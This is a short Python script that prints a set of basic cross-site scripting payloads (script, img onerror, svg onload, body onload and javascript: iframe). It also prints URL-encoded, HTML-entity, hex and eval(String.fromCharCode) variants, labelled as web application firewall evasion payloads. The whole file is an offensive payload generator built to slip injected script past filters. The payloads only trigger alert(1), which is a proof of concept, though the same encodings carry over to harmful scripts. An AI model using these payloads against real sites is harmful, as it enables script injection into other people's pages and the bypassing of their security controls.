import urllib.parse

# List of basic payloads
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>"
]

def encode_payload(payload):
    return {
        "raw": payload,
        "url_encoded": urllib.parse.quote(payload),
        "html_entity_encoded": ''.join(f'&#{ord(c)};' for c in payload),
        "hex_encoded": ''.join(f'\\x{ord(c):02x}' for c in payload),
        "from_char_code": f"eval(String.fromCharCode({','.join(str(ord(c)) for c in 'alert(1)')}))"
    }

def generate_variants():
    print("=== WAF Evasion Payloads ===")
    for i, p in enumerate(payloads):
        encoded = encode_payload(p)
        print(f"\nPayload {i+1}: {p}")
        for k, v in encoded.items():
            print(f"{k}: {v}")

if __name__ == "__main__":
    generate_variants()
